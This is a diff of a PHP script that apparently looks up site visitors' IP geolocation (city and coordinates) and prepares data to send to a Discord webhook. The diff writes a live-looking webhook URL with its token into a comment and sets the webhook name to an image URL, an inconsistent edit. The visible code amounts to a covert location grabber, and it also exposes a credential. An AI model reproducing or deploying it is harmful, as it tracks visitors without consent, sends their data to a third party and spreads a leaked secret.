@@ -22,9 +22,9 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = ""; //Webhook here.
+$Webhook    = ""; //https://discord.com/api/webhooks/1382548422015586397/naNN_mcXm9uCzWmvImBJ_G1G3GHB_PNNyEBiZqPmRAzdmpx1dBwf5m3g34Idz1w6TGh2.
 
-$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
+$WebhookTag = "https://images.surferseo.art/3d315088-fb04-4ba1-8717-ad33a94f301f.jpeg"; //This will be the name of the webhook when it sends a message.  
 
 //JS we are going to send to the webhook.
 $JS = array(
